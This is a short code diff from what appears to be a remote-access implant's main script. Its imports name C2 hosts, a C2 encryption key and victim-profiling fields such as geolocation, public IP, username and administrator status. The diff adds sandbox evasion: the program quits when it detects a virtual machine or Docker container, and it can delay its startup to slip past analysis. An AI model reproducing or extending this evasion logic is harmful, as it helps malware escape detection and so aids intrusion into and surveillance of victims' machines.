@@ -8,12 +8,11 @@ import logging
 import datetime
 import threading
 
-from config import C2_ENCRYPTION_KEY, C2_TIMEOUT, C2_HOSTS
-from infos import (geolocation, administrator, architecture, platform, system_architecture,
-                   language, public_ip, username)
 from utils import OutputLogger, decrypt, encrypt, MessageEncoder, MessageDecoder
 
+from infos import *
 from tasks import *
+from config import *
 
 from modules.translator import Translator
 from modules.activity_analyzer import ActivityAnalyzer
@@ -393,6 +392,16 @@ class Main:
 
 
 if __name__ == '__main__':
+    try:
+        if not ALLOW_VM and is_running_in_vm() or not ALLOW_DOCKER and is_running_in_docker():
+            sys.exit(0)
+    except Exception:
+        if not ALLOW_IF_VM_CHECK_FAILS:
+            sys.exit(0)
+
+    if STARTUP_DELAY:
+        time.sleep(STARTUP_DELAY)
+
     log = OutputLogger()
     m = Main()
     m.run()
